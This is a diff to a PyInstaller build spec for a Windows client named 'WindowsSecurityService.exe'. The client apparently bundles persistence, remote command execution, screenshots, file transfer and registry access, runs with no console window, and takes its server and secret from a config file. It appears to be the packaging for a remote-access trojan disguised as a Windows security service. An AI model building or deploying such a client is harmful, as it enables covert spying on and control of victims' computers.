@@ -1,8 +1,17 @@
 # -*- mode: python ; coding: utf-8 -*-
-# PyInstaller spec file — build with: pyinstaller client.spec
+# PyInstaller spec file
 #
-# Output: dist/WindowsSecurityService.exe
-# Run:    pyinstaller client.spec
+# Before building, generate the icon once:
+#   python client/assets/generate_icon.py
+#
+# Build:
+#   pyinstaller client.spec
+#
+# Deploy layout (next to the exe):
+#   dist/
+#   ├── WindowsSecurityService.exe
+#   └── client/
+#       └── config.yaml          ← required — edit server/secret before build
 
 import sys
 from pathlib import Path
@@ -14,11 +23,17 @@ a = Analysis(
     pathex=[str(Path('.').resolve())],
     binaries=[],
     datas=[
-        ('client/config.yaml', 'client'),
+        # NOTE: config.yaml is NOT bundled inside the exe.
+        # It must be placed next to the exe in a 'client/' subfolder.
+        # This way the user can edit the config without rebuilding.
         ('shared', 'shared'),
-        ('server', 'server'),      # auth module needed at runtime
+        ('server', 'server'),
     ],
     hiddenimports=[
+        'client.paths',
+        'client.persistence',
+        'client.connection',
+        'client.commands.registry',
         'client.commands.execute',
         'client.commands.screenshot',
         'client.commands.file_transfer',
@@ -26,10 +41,14 @@ a = Analysis(
         'client.commands.sysinfo',
         'client.commands.uninstall',
         'websockets',
+        'websockets.legacy',
+        'websockets.legacy.client',
         'cryptography',
+        'cryptography.fernet',
         'yaml',
         'mss',
         'PIL',
+        'PIL.Image',
         'psutil',
         'winreg',
     ],
@@ -59,7 +78,7 @@ exe = EXE(
     upx=True,
     upx_exclude=[],
     runtime_tmpdir=None,
-    console=False,          # No console window — completely silent
+    console=False,
     disable_windowed_traceback=False,
     argv_emulation=False,
     target_arch=None,
